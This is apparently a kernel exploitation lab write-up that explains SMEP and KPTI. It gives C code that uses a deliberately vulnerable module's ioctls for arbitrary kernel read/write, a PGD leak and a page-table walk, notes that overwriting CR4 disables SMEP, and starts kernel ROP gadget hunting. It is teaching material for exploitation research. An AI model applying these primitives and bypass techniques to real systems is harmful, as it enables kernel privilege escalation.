# SMEP bypass

This time we are going to enable KPTI and SMEP and see how we can bypass these protections. First let's check out what theses exploit mitigations do.

## SMEP
SMEP is an acroynm for SupervisorModeExecutionPrevention. Basically it prevents ret2user by preventing the kernel from executing code in userspace. 

You can check how SMEP is enabled in many ways. First, check out the results of `cat /proc/cpuinfo | grep smep`. If there are any matches, then SMEP is enabled.

Second, check out the bootscript of the qemu vm. In the previous lab, the boot script was this.

```bash
#!/bin/bash

qemu-system-x86_64 -initrd initramfs.cpio \
-kernel bzImage \
-append 'console=ttyS0 oops=panic panic=1 nokaslr' \
-monitor /dev/null \
-m 64M --nographic \
-smp cores=1,threads=1 \
```

However, if we add the following arguments to the boot script, SMEP becomes enabled.

```bash
qemu-system-x86_64 -initrd initramfs.cpio \
-kernel bzImage \
-append 'console=ttyS0 oops=panic panic=1 nokaslr' \
-monitor /dev/null \
-m 64M --nographic \
-smp cores=1,threads=1 \
-cpu kvm64,smep
```

It's very obvious that under SMEP, our exploit does not work.

The third way to check if SMEP is enabled is by viewing the contents of the CR4 register. Either by causing a crash or attaching the kernel to a debugger, we can get the value of CR4.

```
[   24.335329] CR2: 000000000deacfd6 CR3: 0000000002b82000 CR4: 00000000001006f0
```

![alt text](cr4.png "CR4")

The 20th bit of the CR4 register indicates the SMEP flag, and we can validate that it is turned on (1<<20 == 0x100000).

The last method implies that changing the value of the CR4 register allows us to disable SMEP.

## KPTI
KPTI stands for Kernel Page Table Insolation. Its purpose is to mitigate meltdown in the linux kernel. Its main feature is to switch page tables when switching mode from kernel to user and vice versa, so that userspace page tables only have the minimal kernel addresses in them.

But in KPTI, all userspace pages are mapped NX (not executable) in kernel page tables. This achieves something very similar to SMEP. 

There are two ways to check if KPTI is enabled. The first way is to check out `cat /proc/cpuinfo | grep pti`. Notice that under the qemu argument `-cpu kvm64,smep` pti is enabled as well.

The second way is to inspect the page table of a process. However, to do this you need to be capable of 'view'ing physical memory. A kernel arbitrary read primitive is sufficient. All physical pages 0~<MAX> are mapped to virtual address page_offset_base~page_offset_base+<MAX>. If you want to know why, read [this material](https://www.usenix.org/sites/default/files/conference/protected-files/sec14_slides_kemerlis.pdf). 

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333
#define VULN_PGD 0x4444

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

unsigned long pageOffsetBase = 0xffff888000000000;

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long read64(unsigned long kaddr) {

	struct rwRequest req;
	unsigned long value;;

	req.uaddr = &value;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_READ, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
	return value;
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

unsigned long leak_pgd() {
	struct rwRequest req;
	unsigned long pgd;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &pgd;
	if (ioctl(fd, VULN_PGD, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return pgd;
}

unsigned long pageTableWalk(unsigned long pgdir, unsigned long vaddr) {

	unsigned long index1 = (vaddr >> 39) & 0x1ff;
	unsigned long index2 = (vaddr >> 30) & 0x1ff;
	unsigned long index3 = (vaddr >> 21) & 0x1ff;
	unsigned long index4 = (vaddr >> 12) & 0x1ff;

	printf("index1: %lx, index2: %lx, index3: %lx index4: %lx\n", index1, index2, index3, index4);
	
	unsigned long lv1 = read64(pgdir + index1*8);
	if (!lv1) {
		printf("[!] lv1 is invalid\n");
		exit(-1);
	}
	printf("lv1: %lx\n", lv1);
	unsigned long lv2 = read64((((lv1 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index2*8);
	if (!lv2) {
		printf("[!] lv2 is invalid\n");
		exit(-1);
	}
	printf("lv2: %lx\n", lv2);
	
	unsigned long lv3 = read64((((lv2 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index3*8);
	if (!lv3) {
		printf("[!] lv3 is invalid\n");
		exit(-1);
	}
	printf("lv3: %lx\n", lv3);

	unsigned long lv4 = read64((((lv3 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index4*8);
	if (!lv4) {
		printf("[!] lv3 is invalid\n");
		exit(-1);
	}
	printf("lv4: %lx\n", lv4);
	
	unsigned long vaddr_alias = (((lv4 >> 12) & 0x3fffffff) << 12) + pageOffsetBase;
	printf("vaddr alias page: %p\n", (void *)vaddr_alias);
	unsigned long pte_addr = (((lv3 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index4*8;
	printf("pte address: %p\n", (void *)pte_addr);
	
	return pte_addr;
}

int main (int argc, char **argv){
	
	void *rwx = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
	if (rwx == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	void *rw = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
	if (rw == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	void *r = mmap(NULL, 0x1000, PROT_READ, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
	if (r == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memset(rwx, 0xcc, 0x1000);
	memset(rw, 0xcc, 0x1000);
	char a = ((char *)r)[0];

	unsigned long pgd = leak_pgd();

	

	printf("[*] page directory is at: %p\n", (void *)pgd);

	
	unsigned long rwx_pte = pageTableWalk(pgd, (unsigned long)rwx);
	unsigned long rw_pte = pageTableWalk(pgd, (unsigned long)rw);
	unsigned long r_pte = pageTableWalk(pgd, (unsigned long)r);

	printf("[*] RWX: %016lx\n", read64(rwx_pte));
	printf("[*] RW : %016lx\n", read64(rw_pte));
	printf("[*] R  : %016lx\n", read64(r_pte));
	
	return 0;
}
```

The code above is a helper script to find the address of the PTE (Page Table Entry) of a certain virtual address, when PGD is provided. So I decided to add the primitive of leaking the pgd in my vulnerable kernel module.

Also one thing to be very cautious is to make sure all the mmap'ed pages are touch'ed at least once, or else they will not be mapped to RAM. This is because of a mechanism called demand-on-paging, which means physical memory is mapped at the page fault handler. Before a page fault occurs, the kernel only stores information about that mapping and the actual mapping is not done.

```c
if (cmd == 0x4444) {
		// return the top level page directory
		void *pgd = current_task->mm->pgd;
		if (copy_from_user(&req, (void *)arg, sizeof(req))) {
			printk(KERN_ERR "invalid address in pgd leak");
			return -EFAULT;
		}

		if (copy_to_user(req.uaddr, &pgd, sizeof(pgd))) {
			printk(KERN_ERR "invalid address in pgd leak");
			return -EFAULT;
		}
	}
```

Now using the page table walker, let's check out if userspace pages are actually all marked NX.

```
[*] RWX: 0000000001c19067
[*] RW : 8000000001c1a067
[*] R  : 80000000028a5225
```

Interestingly, PTE (lowest level entry)'s NX bit is not set. However, the PGDE (lv1)'s NX bit were set for all pages. 

```
lv1: 8000000002b7b067
```

This design is much more reasonable, because the overhead for marking all PTEs is much larger than marking the NX bit for PGDE. This is because user pages will share PGDE because of the multilevel hierarchy. By the way, if we turn of SMEP/KPTI it shows

```
lv1: 2b37067
```

which explains why ret2usr attacks work. (The NX bit is not set)

## Kernel ROP
The bypass for Kernel SMEP/KPTI is analagous to NX bypass in userspace, which is ROP (return oriented programming). Triggering ROP in kernelspace requires a stack pivot, which is done by a stack pivot gadget. The basic idea is to place a ROP chain in a mmap'ed address and change the stack pointer to that address.

To find gadgets, we must first decompress the bzImage file. bzImage is a compressed version of the kernel image, so in order to find gadgets we need to decompress it using [this]() script. It is included in the `image` directory, so to decompress the bzImage just do `./extract-vmlinux.sh bzImage > vmlinux`.

Then run ROPgadget on vmlinux. `ROPgadget --binary vmlinux > gadgets`

It will take a long time because a kernel image is huge, unlike userspace programs. The number of gadgets is substantial.

![alt text](size.png "size")
